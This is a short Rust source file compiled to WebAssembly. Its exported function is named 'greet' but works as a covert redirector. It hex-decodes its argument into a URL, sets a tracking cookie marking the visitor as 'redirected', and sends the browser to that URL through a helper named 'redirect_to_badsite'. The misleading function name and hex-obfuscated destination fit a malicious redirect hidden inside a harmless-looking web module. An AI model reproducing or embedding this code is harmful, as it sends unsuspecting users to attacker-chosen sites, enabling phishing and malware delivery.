#![deny(unsafe_code)]
use wasm_bindgen::prelude::*;
use web_sys::{window, HtmlDocument, Document, Location};

fn set_cookie(name: &str, value: &str) -> Result<(), JsValue> {
    let window = window().ok_or("no global window exists")?;
    let document: Document = window.document().ok_or("no document exists")?;
    let html_document: HtmlDocument = document.dyn_into::<HtmlDocument>()?;

    let cookie = format!(
        "{}={}; max-age={}; path=/; samesite=lax",
        name,
        value,
        1 * 24 * 60 * 60
    );
    
    html_document.set_cookie(&cookie)?;
    Ok(())

}

fn redirect_to_badsite(loc: &str) -> Result<(), JsValue> {
    let window = window().ok_or("no global window exists")?;
    let location: Location = window.location();
    
    location.set_href(loc)?;
    Ok(())
}

// Only used for debugging purposes
/*
#[wasm_bindgen]
extern "C" {
    #[wasm_bindgen(js_namespace = console)]
    fn log(s: &str);
}
*/

fn decode_url(encoded_url: &str) -> Result<String, JsValue> {
    let decoded_bytes = hex::decode(encoded_url).map_err(|_| JsValue::from_str("Invalid hex encoding"))?;
    let decoded_url = String::from_utf8(decoded_bytes).map_err(|_| JsValue::from_str("Invalid UTF-8 sequence"))?;
    Ok(decoded_url)
}

#[wasm_bindgen]
pub fn greet(name: &str) -> Result<(), JsValue> {
    let decoded_url = decode_url(name)?;
    set_cookie("get", "redirected")?;
    redirect_to_badsite(&decoded_url)?;
    Ok(())
}
